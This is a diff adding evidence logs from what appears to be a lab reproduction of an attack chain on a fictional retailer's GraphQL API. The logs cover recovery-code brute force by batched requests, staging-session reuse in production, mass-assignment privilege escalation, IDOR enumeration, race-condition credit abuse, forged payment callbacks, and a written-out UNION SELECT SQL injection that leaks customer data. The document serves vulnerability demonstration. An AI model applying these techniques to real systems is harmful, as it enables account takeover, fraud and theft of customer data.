@@ -1,0 +1,438 @@
+
+
+########## 01_recon_introspection ##########
+
+======================================================================
+[F2] Staging path walk (404s + 2x200 on /graphql-ish & /schema)
+======================================================================
+{
+  "/.env": {
+    "status": 404,
+    "bytes": 207
+  },
+  "/.git/config": {
+    "status": 404,
+    "bytes": 207
+  },
+  "/config.json": {
+    "status": 404,
+    "bytes": 207
+  },
+  "/admin": {
+    "status": 404,
+    "bytes": 207
+  },
+  "/api": {
+    "status": 404,
+    "bytes": 207
+  },
+  "/graphql": {
+    "status": 405,
+    "bytes": 153
+  },
+  "/schema": {
+    "status": 200,
+    "bytes": 281
+  }
+}
+
+======================================================================
+[F3] Staging introspection ENABLED (same image as prod)
+======================================================================
+{
+  "data": {
+    "__schema": {
+      "note": "214 ops in real incident; 11 representative ops in prototype",
+      "operations": [
+        "requestRecoveryCode",
+        "verifyRecoveryCode",
+        "updateProfile",
+        "orderLookup",
+        "submitReview",
+        "redeemStoreCredit",
+        "issueStoreCredit",
+        "bulkExport",
+        "grantRoleAdmin",
+        "grantRoleSupport",
+        "assignSuperRole"
+      ]
+    }
+  }
+}
+
+======================================================================
+[F3] Production introspection DISABLED
+======================================================================
+{
+  "errors": [
+    "Introspection disabled in production"
+  ]
+}
+
+======================================================================
+[F2] Machine-readable /schema route (2nd 200, large body)
+======================================================================
+{
+  "note": "214 ops in real incident; 11 representative ops in prototype",
+  "operations": [
+    "requestRecoveryCode",
+    "verifyRecoveryCode",
+    "updateProfile",
+    "orderLookup",
+    "submitReview",
+    "redeemStoreCredit",
+    "issueStoreCredit",
+    "bulkExport",
+    "grantRoleAdmin",
+    "grantRoleSupport",
+    "assignSuperRole"
+  ]
+}
+
+
+########## 02_recovery_bruteforce ##########
+
+======================================================================
+[F9] Recovery code requested for D. Rathore (on leave 20-27 Jul)
+======================================================================
+{
+  "data": [
+    {
+      "requestRecoveryCode": {
+        "ok": true,
+        "sent_to": "d.rathore@northwind-goods.com"
+      }
+    }
+  ],
+  "meta": {
+    "env": "staging",
+    "http_requests": 1,
+    "ops_executed": 1
+  }
+}
+  HTTP req #1: 500 guesses (000000-000499) | ops_executed=500 | db fails=1 | hits=0
+  HTTP req #2: 500 guesses (000500-000999) | ops_executed=500 | db fails=2 | hits=0
+  HTTP req #3: 500 guesses (001000-001499) | ops_executed=500 | db fails=0 | hits=1
+
+======================================================================
+[F7/F8] Brute force result — 1 HTTP req carried 500 guesses; per-request lockout never tripped
+======================================================================
+{
+  "http_requests_sent": 3,
+  "total_guesses": 1500,
+  "stolen_staging_session": "f91b8a8ee19e363b..."
+}
+
+
+########## 03_session_reuse ##########
+
+======================================================================
+[F28/F29] STAGING session cookie accepted by PRODUCTION (no env binding)
+======================================================================
+{
+  "sent_cookie_prefix": "f91b8a8ee19e363b...",
+  "prod_response": {
+    "data": [
+      {
+        "orderLookup": {
+          "ok": true,
+          "order": {
+            "address": "warehouse-queue",
+            "customer_email": "aarav.sharma@example.in",
+            "ref": "NW500000001",
+            "state": "paid",
+            "total_paise": 299900
+          }
+        }
+      }
+    ],
+    "meta": {
+      "env": "production",
+      "http_requests": 1,
+      "ops_executed": 1
+    }
+  }
+}
+
+
+########## 04_mass_assignment ##########
+
+======================================================================
+[F12/F13] Mass assignment: account_type -> internal_ops (order-admin + bulk export)
+======================================================================
+{
+  "data": [
+    {
+      "updateProfile": {
+        "account_type": "internal_ops",
+        "note": "VULN: no allow-list; store_credit_paise/account_type/email_verified accepted",
+        "ok": true,
+        "patched": {
+          "account_type": "internal_ops",
+          "email": "d.rathore@northwind-goods.com",
+          "phone": "+91-98200-99999"
+        }
+      }
+    }
+  ],
+  "meta": {
+    "env": "production",
+    "http_requests": 1,
+    "ops_executed": 1
+  }
+}
+
+======================================================================
+[F13] bulkExport now succeeds (privilege escalation effective)
+======================================================================
+{
+  "ok": true,
+  "rows_returned": 6,
+  "sample": {
+    "address": "Flat 4B, Bandra West, Mumbai",
+    "email": "aarav.sharma@example.in",
+    "name": "Aarav Sharma",
+    "phone": "+91-98200-11111"
+  }
+}
+
+======================================================================
+[F11] Unguarded assignSuperRole (no decorator, TODO comment) callable by non-admin
+======================================================================
+{
+  "data": [
+    {
+      "assignSuperRole": {
+        "now": "admin",
+        "ok": true,
+        "target": "d.rathore@northwind-goods.com",
+        "warning": "unguarded operation (F11)"
+      }
+    }
+  ],
+  "meta": {
+    "env": "production",
+    "http_requests": 1,
+    "ops_executed": 1
+  }
+}
+
+
+########## 05_idor_enum ##########
+
+======================================================================
+[F14/F15] Sequential IDOR sweep: other customers' orders with one session, no ownership check
+======================================================================
+{
+  "refs_tried": 7,
+  "orders_returned": 7,
+  "sample": [
+    {
+      "address": "warehouse-queue",
+      "customer_email": "aarav.sharma@example.in",
+      "ref": "NW500000001",
+      "state": "paid",
+      "total_paise": 299900
+    },
+    {
+      "address": "warehouse-queue",
+      "customer_email": "diya.patel@example.in",
+      "ref": "NW500000002",
+      "state": "awaiting_payment",
+      "total_paise": 309900
+    }
+  ]
+}
+
+
+########## 06_store_credit ##########
+
+======================================================================
+[F19/F20] No idempotency: 10 concurrent identical refunds -> 10 credits (legit = 1)
+======================================================================
+{
+  "attempts": 10,
+  "succeeded": 10,
+  "balance_now_paise": 500000,
+  "expect_paise": 500000,
+  "ledger_tail_sample": [
+    {
+      "actor": "svc:checkout",
+      "amount_paise": 50000,
+      "customer_email": "d.rathore@northwind-goods.com",
+      "id": 10,
+      "kind": "credit",
+      "order_ref": "NW500000002",
+      "ts": "2026-09-24T12:27:45.481895"
+    },
+    {
+      "actor": "svc:checkout",
+      "amount_paise": 50000,
+      "customer_email": "d.rathore@northwind-goods.com",
+      "id": 9,
+      "kind": "credit",
+      "order_ref": "NW500000002",
+      "ts": "2026-09-24T12:27:45.478931"
+    },
+    {
+      "actor": "svc:checkout",
+      "amount_paise": 50000,
+      "customer_email": "d.rathore@northwind-goods.com",
+      "id": 8,
+      "kind": "credit",
+      "order_ref": "NW500000002",
+      "ts": "2026-09-24T12:27:45.471034"
+    }
+  ]
+}
+
+======================================================================
+[F21] Mass assignment: store_credit_paise overwritten directly (no ledger business logic)
+======================================================================
+{
+  "patch_response": {
+    "data": [
+      {
+        "updateProfile": {
+          "account_type": "admin",
+          "note": "VULN: no allow-list; store_credit_paise/account_type/email_verified accepted",
+          "ok": true,
+          "patched": {
+            "store_credit_paise": 9999000
+          }
+        }
+      }
+    ],
+    "meta": {
+      "env": "production",
+      "http_requests": 1,
+      "ops_executed": 1
+    }
+  },
+  "balance_now_paise": 9999000
+}
+
+======================================================================
+[s2] TOCTOU double-spend: 6 concurrent 30,000 spends against a 100,000 balance
+======================================================================
+{
+  "attempts": 6,
+  "succeeded": 6,
+  "balance_now_paise": 70000,
+  "correct_balance_if_serialised_paise": -80000,
+  "note": "all reads saw ~100,000; all wrote back ~70,000 -> goods worth 180,000 released for ~30,000"
+}
+
+
+########## 07_sqli ##########
+
+======================================================================
+[F17] Malicious review stored verbatim (UNION SELECT over customer columns)
+======================================================================
+{
+  "data": [
+    {
+      "submitReview": {
+        "ok": true
+      }
+    }
+  ],
+  "meta": {
+    "env": "production",
+    "http_requests": 1,
+    "ops_executed": 1
+  }
+}
+
+======================================================================
+[F18] Merchandising report: row count explodes, customer PII in output (cf. 4,800 -> 2,100,441)
+======================================================================
+{
+  "row_count": 8,
+  "rows_sample": [
+    [
+      1,
+      "KETTLE-01",
+      "Heats fast, good build quality"
+    ],
+    [
+      2,
+      "SCALE-02",
+      "Accurate readings, compact size"
+    ],
+    [
+      1,
+      "aarav.sharma@example.in",
+      "+91-98200-11111"
+    ],
+    [
+      2,
+      "diya.patel@example.in",
+      "+91-98200-22222"
+    ],
+    [
+      3,
+      "kabir.khan@example.in",
+      "+91-98200-33333"
+    ],
+    [
+      4,
+      "meera.iyer@example.in",
+      "+91-98200-44444"
+    ]
+  ],
+  "query_sample": "SELECT id, product_id, review_text FROM (SELECT id, product_id, text AS review_text FROM reviews) WHERE review_text = '' UNION SELECT id, email, phone FROM customers -- '"
+}
+
+
+########## 08_callback_forgery ##########
+
+======================================================================
+[F22/F23/F24] Unsigned callbacks mark real awaiting_payment orders paid -> warehouse release
+======================================================================
+[
+  {
+    "ref": "NW500000002",
+    "before": "awaiting_payment",
+    "callback": {
+      "ok": true,
+      "order_ref": "NW500000002",
+      "released_to_warehouse": true,
+      "state": "paid"
+    },
+    "after": "paid"
+  },
+  {
+    "ref": "NW500000003",
+    "before": "awaiting_payment",
+    "callback": {
+      "ok": true,
+      "order_ref": "NW500000003",
+      "released_to_warehouse": true,
+      "state": "paid"
+    },
+    "after": "paid"
+  },
+  {
+    "ref": "NW500000004",
+    "before": "awaiting_payment",
+    "callback": {
+      "ok": true,
+      "order_ref": "NW500000004",
+      "released_to_warehouse": true,
+      "state": "paid"
+    },
+    "after": "paid"
+  }
+]
+
+======================================================================
+[F23] Control: present-but-wrong signature IS rejected (mismatch branch works)
+======================================================================
+{
+  "ok": false,
+  "reason": "bad signature"
+}
+
+
+[+] evidence.json written
